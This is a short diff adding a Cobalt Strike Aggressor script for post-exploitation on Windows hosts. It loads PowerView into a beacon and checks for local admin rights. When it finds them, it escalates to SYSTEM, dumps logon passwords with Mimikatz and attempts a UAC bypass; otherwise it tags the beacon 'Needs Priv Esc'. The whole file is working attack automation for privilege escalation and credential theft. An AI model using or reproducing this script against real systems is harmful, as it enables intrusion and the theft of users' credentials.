@@ -1,0 +1,25 @@
+alias checkLA {
+	
+bpowershell_import($1, script_resource("powerview.ps1"));
+$result = bpowershell($1, 'Invoke-CheckLocalAdminAccess');	
+
+on beacon_output {
+  $s = replace($2, 'received output:\n'.'');
+  $f = "True";
+  $g = "False";
+if ($f isin $s)
+		{
+		bgetsystem($1);
+		blogonpasswords($1);
+		beacon_note($1, "Elevated Context: Ran LogonPasswords");
+		$lis = listeners_local();		
+		bbypassuac($1, $lis[0]);		
+		}
+
+if ($g isin $s)
+		{	
+		beacon_note($1, "Needs Priv Esc");
+}		
+}
+}
+
